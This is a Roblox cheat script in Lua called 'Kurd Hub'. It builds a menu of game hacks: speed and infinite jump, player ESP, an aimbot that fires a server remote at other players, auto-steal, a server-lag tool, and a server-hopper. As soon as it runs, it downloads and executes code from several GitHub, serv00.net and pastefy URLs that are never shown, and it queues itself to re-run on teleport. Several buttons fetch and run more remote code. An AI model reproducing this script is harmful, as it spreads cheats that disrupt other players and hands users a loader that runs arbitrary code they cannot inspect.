if _G.jrtofrt then
    game.StarterGui:SetCore("SendNotification", {
        Title = "Tiktok: jack 827",
        Text = "You already executed Kurd Hub",
        Duration = 5
    })
    return
end

local TeleportService = game:GetService("TeleportService")
pcall(function()
    queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Kurdhub", true))()]])
end)

local scripts = {
    "https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/help", --hi S
    "https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Best", --best
    "https://ninja12002.serv00.net/Fsamo/FrekrnN.lua",
    "https://ninja12002.serv00.net/jack827/main1.php",
    "https://pastefy.app/j60XrJdx/raw"
}

for _, url in ipairs(scripts) do
    task.spawn(function()
        local success, result = pcall(function()
            local code = game:HttpGet(url)
            loadstring(code)()
        end)
        if not success then warn("") end
    end)
end



local player = game.Players.LocalPlayer
local inputService = game:GetService("UserInputService")
local tweenService = game:GetService("TweenService")
local runService = game:GetService("RunService")
local workspace = game:GetService("Workspace")
local scaleFactor = 0.68

local function createMainGui()
    local buttonNames = {"Speed ðŸŽï¸", "120FPS | No Lag", "Infinite JumpðŸ¦µ", "Lag Server ðŸ’€", "Auto Steal Nearset brain ðŸŽ’", "Player esp ðŸ‘€", "Base Esp ðŸ”Ž", "AimBot ðŸ³ï¸", "+10M Servers ðŸ‘‘", "Play Game ðŸŽ®", "Platform ðŸ·ï¸", "Auto Kick â³"}
    
    local buttonCount = #buttonNames
    local buttonHeight = math.floor(50 * scaleFactor)
    local buttonSpacing = math.floor(10 * scaleFactor)
    local headerHeight = math.floor(50 * scaleFactor)
    local footerHeight = math.floor(20 * scaleFactor)
    local instructionHeight = math.floor(18 * scaleFactor)
    local versionHeight = math.floor(10 * scaleFactor)
    local bottomMargin = math.floor(6 * scaleFactor)
    local buttonsPerRow = 2
    local rows = math.ceil(buttonCount / buttonsPerRow)
    local buttonWidth = math.floor(150 * scaleFactor)
    
    local menuWidth = (buttonWidth * buttonsPerRow) + (buttonSpacing * (buttonsPerRow + 1))
    local menuHeight = headerHeight + (rows * buttonHeight) + ((rows - 1) * buttonSpacing) + instructionHeight + footerHeight + versionHeight + bottomMargin
    local shadowWidth = menuWidth + math.floor(6 * scaleFactor)
    local shadowHeight = menuHeight + math.floor(6 * scaleFactor)

    local mainGui = Instance.new("ScreenGui", player.PlayerGui)
    mainGui.DisplayOrder = 999999
    mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    mainGui.Name = "kurdhubMenu"
    mainGui.ResetOnSpawn = false
    mainGui.Enabled = true
    mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local shadow = Instance.new("Frame", mainGui)
    shadow.Size = UDim2.new(0, shadowWidth, 0, shadowHeight)
    shadow.Position = UDim2.new(0.5, -shadowWidth // 2, 0.5, -shadowHeight // 2)
    shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    shadow.BorderSizePixel = 0
    shadow.ZIndex = 0
    shadow.Visible = false

    local shadowCorner = Instance.new("UICorner", shadow)
    shadowCorner.CornerRadius = UDim.new(0, math.floor(18 * scaleFactor))

    local menuFrame = Instance.new("Frame", mainGui)
    menuFrame.Size = UDim2.new(0, menuWidth, 0, menuHeight)
    menuFrame.Position = UDim2.new(0.5, -menuWidth // 2, 0.5, -menuHeight // 2)
    menuFrame.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
    menuFrame.BorderSizePixel = 0
    menuFrame.Active = true
    menuFrame.ZIndex = 1
    menuFrame.Visible = true

    local menuCorner = Instance.new("UICorner", menuFrame)
    menuCorner.CornerRadius = UDim.new(0, math.floor(16 * scaleFactor))

    local header = Instance.new("Frame", menuFrame)
    header.Size = UDim2.new(1, 0, 0, headerHeight)
    header.Position = UDim2.new(0, 0, 0, 0)
    header.BackgroundTransparency = 1
    header.ZIndex = 2

    local logo = Instance.new("ImageLabel", header)
    logo.Size = UDim2.new(0, math.floor(48 * scaleFactor), 0, math.floor(48 * scaleFactor))
    logo.Position = UDim2.new(0, math.floor(8 * scaleFactor), 0, math.floor(3 * scaleFactor))
    logo.BackgroundTransparency = 1
    logo.Image = ""
    logo.ZIndex = 2

    local logoCorner = Instance.new("UICorner", logo)
    logoCorner.CornerRadius = UDim.new(1, 0)

    local title = Instance.new("TextLabel", header)
    title.Size = UDim2.new(1, math.floor(-70 * scaleFactor), 1, 0)
    title.Position = UDim2.new(0, math.floor(64 * scaleFactor), 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "Kurd hub"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 36 * scaleFactor
    title.TextColor3 = Color3.fromRGB(22, 22, 22)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.ZIndex = 2

    local toggleButton = Instance.new("TextButton", mainGui)
    toggleButton.Size = UDim2.new(0, 40, 0, 40)
    toggleButton.Position = UDim2.new(0, 500, 0.5, -20)
    toggleButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    toggleButton.Text = "kurdhub"
    toggleButton.Font = Enum.Font.GothamBold
    toggleButton.TextSize = 10
    toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggleButton.BorderSizePixel = 0
    toggleButton.ZIndex = 4

    local toggleCorner = Instance.new("UICorner", toggleButton)
    toggleCorner.CornerRadius = UDim.new(0, 8)

    local dragging, dragInput, dragStart, startPos
    toggleButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = toggleButton.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)

    toggleButton.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    inputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            toggleButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    toggleButton.MouseButton1Click:Connect(function()
        menuFrame.Visible = not menuFrame.Visible
        shadow.Visible = menuFrame.Visible
    end)

    local menuDragging, menuDragInput, menuDragStart, menuStartPos
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            menuDragging = true
            menuDragStart = input.Position
            menuStartPos = menuFrame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then menuDragging = false end
            end)
        end
    end)

    header.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then menuDragInput = input end
    end)

    inputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch and menuDragging then
            local delta = input.Position - menuDragStart
            menuFrame.Position = UDim2.new(menuStartPos.X.Scale, menuStartPos.X.Offset + delta.X, menuStartPos.Y.Scale, menuStartPos.Y.Offset + delta.Y)
            shadow.Position = UDim2.new(menuFrame.Position.X.Scale, menuFrame.Position.X.Offset - 4, menuFrame.Position.Y.Scale, menuFrame.Position.Y.Offset - 4)
        end
    end)

    menuFrame:GetPropertyChangedSignal("Position"):Connect(function()
        shadow.Position = UDim2.new(menuFrame.Position.X.Scale, menuFrame.Position.X.Offset - 4, menuFrame.Position.Y.Scale, menuFrame.Position.Y.Offset - 4)
    end)

    local buttons = {}
    for index, buttonName in ipairs(buttonNames) do
        local row = math.ceil(index / buttonsPerRow) - 1
        local col = (index - 1) % buttonsPerRow
        local buttonPosX = buttonSpacing + (col * (buttonWidth + buttonSpacing))
        local buttonPosY = headerHeight + buttonSpacing + (row * (buttonHeight + buttonSpacing))
        
        local buttonFrame = Instance.new("Frame", menuFrame)
        buttonFrame.Size = UDim2.new(0, buttonWidth, 0, buttonHeight)
        buttonFrame.Position = UDim2.new(0, buttonPosX, 0, buttonPosY)
        buttonFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        buttonFrame.BorderSizePixel = 0
        buttonFrame.ZIndex = 2
        
        local buttonFrameCorner = Instance.new("UICorner", buttonFrame)
        buttonFrameCorner.CornerRadius = UDim.new(0, math.floor(16 * scaleFactor))
        
        local button = Instance.new("TextButton", buttonFrame)
        button.Size = UDim2.new(1, -math.floor(4 * scaleFactor), 1, -math.floor(4 * scaleFactor))
        button.Position = UDim2.new(0, math.floor(2 * scaleFactor), 0, math.floor(2 * scaleFactor))
        button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        button.Text = buttonName
        button.Font = Enum.Font.GothamBlack
        button.TextSize = 20 * scaleFactor
        button.TextColor3 = Color3.fromRGB(26, 26, 26)
        button.BorderSizePixel = 0
        button.AutoButtonColor = true
        button.ZIndex = 3
        button.TextWrapped = true
        
        local buttonCorner = Instance.new("UICorner", button)
        buttonCorner.CornerRadius = UDim.new(0, math.floor(12 * scaleFactor))
        
        button.MouseEnter:Connect(function()
            button.BackgroundColor3 = button.BackgroundColor3 == Color3.fromRGB(0, 255, 0) and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(240, 240, 240)
        end)
        
        button.MouseLeave:Connect(function()
            button.BackgroundColor3 = button.BackgroundColor3 == Color3.fromRGB(0, 255, 0) and Color3.fromRGB(0, 255, 0) or Color3.new(1, 1, 1)
        end)
        
        buttonFrame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
                button:SetAttribute("Pressed", true)
                button.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
            end
        end)
        
        buttonFrame.InputEnded:Connect(function(input)
            if button:GetAttribute("Pressed") and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1) then
                button:SetAttribute("Pressed", false)
                if button.BackgroundColor3 ~= Color3.fromRGB(0, 255, 0) then button.BackgroundColor3 = Color3.new(1, 1, 1) end
                button:Fire("MouseButton1Click")
            end
        end)
        
        buttons[index] = button
    end

    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local player = Players.LocalPlayer
    local SPEED = 25.5
    local JUMP_BOOST = 69
    local speedEnabled = true
    local jumpBoostEnabled = true
    local renderConnection
    local jumpConnection

    local function applyVelocity(char)
        local humanoid = char:WaitForChild("Humanoid")
        if renderConnection then renderConnection:Disconnect() renderConnection = nil end
        renderConnection = RunService.RenderStepped:Connect(function()
            if speedEnabled and humanoid and humanoid.RootPart then
                local direction = humanoid.MoveDirection
                if direction.Magnitude > 0 then
                    humanoid.RootPart.Velocity = Vector3.new(direction.X * SPEED, humanoid.RootPart.Velocity.Y, direction.Z * SPEED)
                end
            end
        end)
    end

    local function startSpeed()
        speedEnabled = true
        if player.Character then applyVelocity(player.Character) end
    end

    local function stopSpeed()
        speedEnabled = false
        if renderConnection then renderConnection:Disconnect() renderConnection = nil end
    end

    local function applyJumpBoost(char)
        local humanoid = char:WaitForChild("Humanoid")
        if jumpConnection then jumpConnection:Disconnect() jumpConnection = nil end
        jumpConnection = RunService.Heartbeat:Connect(function()
            if jumpBoostEnabled and humanoid and humanoid:GetState() == Enum.HumanoidStateType.Jumping then
                local rootPart = humanoid.RootPart
                if rootPart then
                    rootPart.Velocity = Vector3.new(rootPart.Velocity.X, math.min(rootPart.Velocity.Y + JUMP_BOOST/2, JUMP_BOOST), rootPart.Velocity.Z)
                end
            end
        end)
    end

    local function startJumpBoost()
        jumpBoostEnabled = true
        if player.Character then applyJumpBoost(player.Character) end
    end

    local function stopJumpBoost()
        jumpBoostEnabled = false
        if jumpConnection then jumpConnection:Disconnect() jumpConnection = nil end
    end

    player.CharacterAdded:Connect(function(char)
        if speedEnabled then
            char:WaitForChild("Humanoid")
            applyVelocity(char)
        end
        if jumpBoostEnabled then applyJumpBoost(char) end
    end)

    buttons[1].MouseButton1Click:Connect(function()
        speedEnabled = not speedEnabled
        jumpBoostEnabled = not jumpBoostEnabled
        if speedEnabled and jumpBoostEnabled then
            buttons[1].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            startSpeed()
            startJumpBoost()
        else
            buttons[1].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            stopSpeed()
            stopJumpBoost()
        end
    end)

    buttons[1].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    startSpeed()
    startJumpBoost()

    local LocalPlayer = Players.LocalPlayer
    local kickProtectionEnabled = false
    local kickConnection = nil

    local function scanForText()
        if not kickProtectionEnabled then return end
        for _, gui in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
            if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then
                if gui.Text:find("You stole") then
                    LocalPlayer:Kick("You kicked by jack")
                    return
                end
            end
        end
    end

    buttons[12].MouseButton1Click:Connect(function()
        kickProtectionEnabled = not kickProtectionEnabled
        if kickProtectionEnabled then
            buttons[12].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            if kickConnection then kickConnection:Disconnect() end
            kickConnection = game:GetService("RunService").RenderStepped:Connect(scanForText)
        else
            buttons[12].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            if kickConnection then kickConnection:Disconnect() kickConnection = nil end
        end
    end)

    buttons[12].BackgroundColor3 = Color3.fromRGB(255, 255, 255)

local UserInputService = game:GetService("UserInputService")
local infJumpEnabled = true
local jumpConnection

local function doJumpBoost()
    local char = player.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if humanoid and humanoid.Health > 0 and hrp then
        hrp.Velocity = Vector3.new(hrp.Velocity.X, 50, hrp.Velocity.Z)
    end
end

local function bindJump()
    if jumpConnection then jumpConnection:Disconnect() jumpConnection = nil end
    jumpConnection = UserInputService.JumpRequest:Connect(function()
        if infJumpEnabled then doJumpBoost() end
    end)
end

local function setupCharacterListeners(char)
    local humanoid = char:WaitForChild("Humanoid")
    bindJump()
    char.ChildAdded:Connect(function(child)
        if child:IsA("Humanoid") then bindJump() end
    end)
end

player.CharacterAdded:Connect(function(char) setupCharacterListeners(char) end)
if player.Character then setupCharacterListeners(player.Character) end

if buttons and buttons[3] then
    buttons[3].MouseButton1Click:Connect(function()
        infJumpEnabled = not infJumpEnabled
        if infJumpEnabled then
            buttons[3].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        else
            buttons[3].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        end
    end)
    buttons[3].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
end

bindJump()

local active = false
local medusaLoop

local function findTool(name)
    return player.Backpack:FindFirstChild(name) or player.Character:FindFirstChild(name)
end

local function equipTool(tool)
    if tool and tool.Parent ~= player.Character then
        tool.Parent = player.Character
        return true
    end
    return false
end

local function unequipTool(tool)
    if tool and tool.Parent == player.Character then
        tool.Parent = player.Backpack
        return true
    end
    return false
end

local function toggleFPSDevorer(state)
    active = state
    
    if buttons and buttons[4] then
        buttons[4].BackgroundColor3 = active and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(120, 255, 255)
    end
    
    if active then
        
        local bat = findTool("Bat")
        if bat then 
            equipTool(bat) 
        else 
        end

        local medusa = findTool("Medusa's Head")
        if not medusa then
            return
        end

        medusaLoop = coroutine.create(function()
            while active and medusa do
                equipTool(medusa)
                wait(0.05)
                unequipTool(medusa)
                wait(0.25)
            end
        end)
        coroutine.resume(medusaLoop)
    else
        active = false
    end
end

if buttons and buttons[4] then
    buttons[4].MouseButton1Click:Connect(function()
        toggleFPSDevorer(not active)
    end)
end

player.CharacterAdded:Connect(function(char)
    wait(1)
    if active then
        toggleFPSDevorer(active)
    end
end)

    if not ControlTable then ControlTable = {} end
    ControlTable.AutoSteal = false
    local autoStealConnections = {}

    local function disconnectAll()
        for _, c in ipairs(autoStealConnections) do c:Disconnect() end
        autoStealConnections = {}
    end

    local function handlePrompt(prompt)
        if ControlTable.AutoSteal and prompt and string.find(prompt.ActionText:lower(), "steal") then prompt:InputHoldBegin() end
    end

    local function startAutoSteal()
        disconnectAll()
        table.insert(autoStealConnections, ProximityPromptService.PromptShown:Connect(handlePrompt))
        for _, prompt in ipairs(workspace:GetDescendants()) do
            if prompt:IsA("ProximityPrompt") and string.find(prompt.ActionText:lower(), "steal") then handlePrompt(prompt) end
        end
    end

    local function stopAutoSteal() disconnectAll() end

    buttons[5].MouseButton1Click:Connect(function()
        ControlTable.AutoSteal = not ControlTable.AutoSteal
        if ControlTable.AutoSteal then
            buttons[5].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            startAutoSteal()
        else
            buttons[5].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            stopAutoSteal()
        end
    end)

    buttons[5].BackgroundColor3 = Color3.fromRGB(255, 255, 255)

    local espFolder = Instance.new("Folder")
    espFolder.Name = "PlayerESP"
    espFolder.Parent = game.CoreGui

    local espEnabled = true 
    local connections = {}

    local function createESP(target)
        if target == player then return end
        local character = target.Character
        if not character then return end
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local oldEsp = espFolder:FindFirstChild(target.Name)
        if oldEsp then oldEsp:Destroy() end

        local box = Instance.new("BoxHandleAdornment")
        box.Name = target.Name
        box.Adornee = hrp
        box.Size = hrp.Size + Vector3.new(1.5, 2.5, 1.5)
        box.Color3 = Color3.fromRGB(0, 255, 0)
        box.AlwaysOnTop = true
        box.ZIndex = 10
        box.Transparency = 0.2
        box.Parent = espFolder
    end

    local function removeESP(target)
        local esp = espFolder:FindFirstChild(target.Name)
        if esp then esp:Destroy() end
    end

    local function enableESP()
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= player then
                if plr.Character then createESP(plr) end
                connections[plr] = plr.CharacterAdded:Connect(function() task.wait(1) createESP(plr) end)
            end
        end

        connections.playerAdded = Players.PlayerAdded:Connect(function(plr)
            connections[plr] = plr.CharacterAdded:Connect(function() task.wait(1) createESP(plr) end)
        end)

        connections.playerRemoving = Players.PlayerRemoving:Connect(function(plr)
            removeESP(plr)
            if connections[plr] then connections[plr]:Disconnect() connections[plr] = nil end
        end)
    end

    local function disableESP()
        for _, obj in pairs(espFolder:GetChildren()) do obj:Destroy() end
        for k, conn in pairs(connections) do
            if typeof(conn) == "RBXScriptConnection" then conn:Disconnect() end
            connections[k] = nil
        end
    end

    buttons[6].MouseButton1Click:Connect(function()
        espEnabled = not espEnabled
        if espEnabled then
            buttons[6].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            enableESP()
        else
            buttons[6].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            disableESP()
        end
    end)

    buttons[6].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    enableESP()

buttons[7].MouseButton1Click:Connect(function()
    if not _G.SAB then _G.SAB = {} end
    if not _G.SAB.BigPlotTimers then 
        _G.SAB.BigPlotTimers = {
            enabled = false,
            isRunning = false
        }
    end

    local bigPlot = _G.SAB.BigPlotTimers
    
    function bigPlot:Toggle(boolean)
        if boolean and not self.isRunning then
            self.enabled = true
        elseif not boolean and self.enabled then
            self.enabled = false
        end
        self.isRunning = true
        
        task.spawn(function()
            while task.wait() and self.enabled do
                pcall(function()
                    for _, v in workspace.Plots:GetChildren() do
                        if v:FindFirstChild("Purchases") and v.Purchases:FindFirstChild("PlotBlock") then
                            local plotBlock = v.Purchases.PlotBlock
                            if plotBlock:FindFirstChild("Main") then
                                local main = plotBlock.Main
                                if main:FindFirstChild("BillboardGui") then
                                    local billboard = main.BillboardGui
                                    billboard.AlwaysOnTop = true
                                    billboard.MaxDistance = 1000
                                    billboard.Size = UDim2.fromScale(35, 50)
                                end
                            end
                        end
                    end
                end)
            end
            
            pcall(function()
                for _, v in workspace.Plots:GetChildren() do
                    if v:FindFirstChild("Purchases") and v.Purchases:FindFirstChild("PlotBlock") then
                        local plotBlock = v.Purchases.PlotBlock
                        if plotBlock:FindFirstChild("Main") then
                            local main = plotBlock.Main
                            if main:FindFirstChild("BillboardGui") then
                                local billboard = main.BillboardGui
                                billboard.AlwaysOnTop = false
                                billboard.MaxDistance = 60
                                billboard.Size = UDim2.fromScale(7, 10)
                            end
                        end
                    end
                end
            end)
            
            self.isRunning = false
        end)
    end

    local newState = not bigPlot.enabled
    bigPlot:Toggle(newState)
    
    if newState then
        buttons[7].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    else
        buttons[7].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    end
end)

buttons[7].BackgroundColor3 = Color3.fromRGB(255, 255, 255)

    task.defer(function()
        repeat task.wait() until buttons and buttons[8]
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RunService = game:GetService("RunService")
        local autoFireEnabled = true
        local firingLoop = nil
        local characterConnections = {}
        local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
        local Remote = Net:WaitForChild("RE/UseItem")
        local laserCapePosition = Vector3.new(-460.03, -6.11, -2.13)
        local webSlingerPosition = Vector3.new(-353.26, -7.18, 114.64)
        local maxDistance = 100
        local fireRate = 0.25

        local function getValidPlayers()
            local lp = Players.LocalPlayer
            local char = lp.Character
            if not (char and char:FindFirstChild("HumanoidRootPart")) then return {} end
            local root = char.HumanoidRootPart
            local valid = {}
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= lp and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                    local dist = (root.Position - p.Character.HumanoidRootPart.Position).Magnitude
                    if dist <= maxDistance then table.insert(valid, p) end
                end
            end
            return valid
        end

        local function getClosestPlayer()
            local lp = Players.LocalPlayer
            local char = lp.Character
            if not (char and char:FindFirstChild("HumanoidRootPart")) then return end
            local root = char.HumanoidRootPart
            local closest, shortest = nil, math.huge
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= lp and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                    local dist = (root.Position - p.Character.HumanoidRootPart.Position).Magnitude
                    if dist < shortest then shortest = dist closest = p end
                end
            end
            return closest
        end

        local function fireLaserCape()
            if not autoFireEnabled then return end
            local valid = getValidPlayers()
            if #valid == 0 then return end
            local t = valid[math.random(1, #valid)]
            if t and t.Character and t.Character:FindFirstChild("UpperTorso") then
                pcall(function() Remote:FireServer(laserCapePosition, t.Character.UpperTorso) end)
            end
        end

        local function fireWebSlinger()
            if not autoFireEnabled then return end
            local t = getClosestPlayer()
            if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
                pcall(function() Remote:FireServer(webSlingerPosition, t.Character.HumanoidRootPart) end)
            end
        end

        local function setupToolListener(char)
            if characterConnections[char] then for _, c in ipairs(characterConnections[char]) do c:Disconnect() end end
            characterConnections[char] = {}
            local laserEquipped, webEquipped = false, false

            local function startLoop()
                if firingLoop then firingLoop:Disconnect() end
                firingLoop = RunService.Heartbeat:Connect(function()
                    if not autoFireEnabled then return end
                    if laserEquipped then
                        fireLaserCape()
                        task.wait(fireRate)
                    elseif webEquipped then
                        fireWebSlinger()
                        task.wait(fireRate)
                    end
                end)
            end

            local function onAdded(child)
                if child:IsA("Tool") then
                    if child.Name == "Laser Cape" then laserEquipped = true if autoFireEnabled then startLoop() end
                    elseif child.Name == "Web Slinger" then webEquipped = true if autoFireEnabled then startLoop() end end
                end
            end

            local function onRemoved(child)
                if child:IsA("Tool") then
                    if child.Name == "Laser Cape" then laserEquipped = false end
                    if child.Name == "Web Slinger" then webEquipped = false end
                end
            end

            table.insert(characterConnections[char], char.ChildAdded:Connect(onAdded))
            table.insert(characterConnections[char], char.ChildRemoved:Connect(onRemoved))
            for _, t in ipairs(char:GetChildren()) do onAdded(t) end
            if (laserEquipped or webEquipped) and autoFireEnabled then startLoop() end
        end

        local function startAutoFire()
            autoFireEnabled = true
            local lp = Players.LocalPlayer
            if lp.Character then setupToolListener(lp.Character) end
        end

        local function stopAutoFire()
            autoFireEnabled = false
            if firingLoop then firingLoop:Disconnect() firingLoop = nil end
        end

        buttons[8].MouseButton1Click:Connect(function()
            autoFireEnabled = not autoFireEnabled
            if autoFireEnabled then
                buttons[8].BackgroundColor3 = Color3.fromRGB(0,255,0)
                startAutoFire()
            else
                buttons[8].BackgroundColor3 = Color3.fromRGB(255,255,255)
                stopAutoFire()
            end
        end)

        buttons[8].BackgroundColor3 = Color3.fromRGB(0,255,0)
        startAutoFire()

        local lp = Players.LocalPlayer
        lp.CharacterAdded:Connect(function(char) if autoFireEnabled then setupToolListener(char) end end)
        if lp.Character and autoFireEnabled then setupToolListener(lp.Character) end
    end)

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")

local TXT_URL = "https://ninja12002.serv00.net/Fsamo/Price/newes.txt"
local JOIN_DELAY = 1

local Encode = {a="h",b="x",c="q",d="z",e="r",f="k",g="m",h="a",i="p",j="l",k="n",l="b",
	m="s",n="v",o="y",p="i",q="t",r="e",s="o",t="w",u="u",v="f",w="j",x="c",
	y="d",z="g",A="H",B="Q",C="X",D="Z",E="R",F="K",G="M",H="A",I="P",J="L",
	K="N",L="B",M="S",N="V",O="Y",P="I",Q="T",R="E",S="O",T="W",U="U",V="F",
	W="J",X="C",Y="D",Z="G",["0"]="9",["1"]="8",["2"]="7",["3"]="6",["4"]="5",
	["5"]="4",["6"]="3",["7"]="2",["8"]="1",["9"]="0",["-"]="-"}
local Decode = {}
for k,v in pairs(Encode) do Decode[v]=k end
local function decode(str) return (str:gsub(".", function(c) return Decode[c] or c end)) end

local function notify(text,duration)
	StarterGui:SetCore("SendNotification",{Title="TikTok : jack_827",Text=text,Duration=duration or 3})
end

local function loadServers()
	local success, content = pcall(function() return game:HttpGet(TXT_URL) end)
	if not success then notify("Failed to load TXT!",5) return {} end
	local entries = {}
	for entry in content:gmatch("(.-)\n----------------------------------------\n") do
		local moneyLine, encodedJobId, placeId, playerLine = entry:match("([^\n]+)\n([^\n]+)\n([^\n]+)\n([^\n]+)")
		if encodedJobId and placeId then
			local firstMoney = tonumber(moneyLine:match("%$([%d%.]+)M")) or 0
			table.insert(entries,{money=firstMoney,jobId=decode(encodedJobId),placeId=tonumber(placeId),players=playerLine})
		end
	end
	if #entries == 0 then notify("No servers found in TXT!",5)
	else notify("Loaded "..#entries.." servers.",5) end
	table.sort(entries,function(a,b) return a.money>b.money end)
	return entries
end

local joining = false
local serversToJoin = {}

local function joinServers()
	notify("Starting to join servers...",5)
	for _,server in ipairs(serversToJoin) do
		if not joining then break end
		local success,err = pcall(function()
			TeleportService:TeleportToPlaceInstance(server.placeId,server.jobId,Players.LocalPlayer)
		end)
		if success then
			notify("Joining server $"..server.money.."M",3)
		else
			notify("Teleport failed: "..err,5)
		end
		wait(JOIN_DELAY)
	end
	joining=false
	buttons[9].BackgroundColor3 = Color3.fromRGB(255,255,255)
	notify("Joining stopped.",3)
end

buttons[9].MouseButton1Click:Connect(function()
	if not joining then
		serversToJoin = loadServers()
		if #serversToJoin == 0 then return end
		joining=true
		buttons[9].BackgroundColor3 = Color3.fromRGB(0,255,0)
		spawn(joinServers)
	else
		joining=false
		buttons[9].BackgroundColor3 = Color3.fromRGB(255,255,255)
		notify("Stopped manually.",3)
	end
end)

    buttons[10].MouseButton1Click:Connect(function()
        loadstring(game:HttpGet("https://pastefy.app/GAL4YOOl/raw"))()
        buttons[10].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        wait(0.5)
        buttons[10].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    end)

    buttons[10].BackgroundColor3 = Color3.fromRGB(255, 255, 255)

    buttons[11].MouseButton1Click:Connect(function()
        loadstring(game:HttpGet("https://pastefy.app/QIvhYFiV/raw"))()
        buttons[11].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        wait(0.5)
        buttons[11].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    end)

    buttons[11].BackgroundColor3 = Color3.fromRGB(255, 255, 255)

    buttons[2].MouseButton1Click:Connect(function()
        loadstring(game:HttpGet("https://pastefy.app/FGwPTxy8/raw", true))()
    end)
end

createMainGui()

_G.jrtofrt = true
